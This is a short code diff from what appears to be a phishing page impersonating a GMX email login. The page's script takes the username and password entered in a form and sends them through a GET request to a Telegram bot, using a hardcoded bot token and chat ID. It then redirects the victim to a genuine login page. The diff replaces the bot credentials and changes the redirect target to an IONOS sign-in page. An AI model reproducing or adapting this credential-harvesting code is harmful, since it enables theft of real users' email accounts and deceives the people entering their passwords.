@@ -249,8 +249,8 @@ footer#footer ul li{
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "7323137846:AAHQbpbpB0Enciab9VWHn7Q25kmskMaAI08",
-          chatID: "7440957972"
+          TOKEN: "8104055289:AAEB55qQmp-nkD7m6kVdA-rKWAC7GJWngD8",
+          chatID: "6509591831"
       }
 
 
@@ -263,7 +263,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=GMX-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://gmx.net");
+              window.location.replace("https://id.ionos.de/identifier");
           }, error => {
               alert("Message not sent")
               console.log(error)
